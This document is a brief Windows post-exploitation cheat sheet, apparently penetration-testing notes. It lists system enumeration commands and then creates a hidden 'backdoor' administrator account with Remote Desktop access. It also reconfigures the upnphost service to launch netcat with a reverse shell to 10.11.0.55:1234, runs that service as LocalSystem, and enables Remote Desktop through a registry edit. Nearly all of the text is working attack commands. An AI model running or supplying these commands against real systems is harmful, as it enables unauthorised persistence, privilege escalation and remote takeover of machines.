
## Windows commands:

`whoami`

`systeminfo | findstr /B "OS"` 

`ipconfig /all`

`netstat -an`

`route print`

`net start`

`tasklist /V`

`net user`

`net user bob`

`net use`

### Add user
`net user backdoor backdoor123 /add`

### Add user to Administrator group
`net localgroup Administrators backdoor /add`

### Add user to remotedesktop
`net localgroup "Remote Desktop Users" backdoor /add`

### Get directory permission

`cacls Music`

or

`icacls Music`

`accesschk.exe -uwcqv "Authenticated Users" *`

` accesschk.exe -ucqv SSDPSRV`

`sc qc upnphost`

`sc config upnphost binpath= "C:\Inetpub\scripts\nc.exe 10.11.0.55 1234 -e C:\WINDOWS\System32\cmd.exe"`

`sc config upnphost obj= ".\LocalSystem" password= ""`

`sc qc upnphost`

### remove the dependency:

`$ sc config upnphost depend= ""`



windows service requires the executable to send back some feedback call within 30 seconds after a service had started. Or else, it will considered it as failed start attempt and terminate the service.

there are few workarounds on this, the easiest way is simply wrap your command in cmd.exe. i.e, cmd.exe /k <ur command>.


We can enable remote desktop from windows command line by running the following command:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f





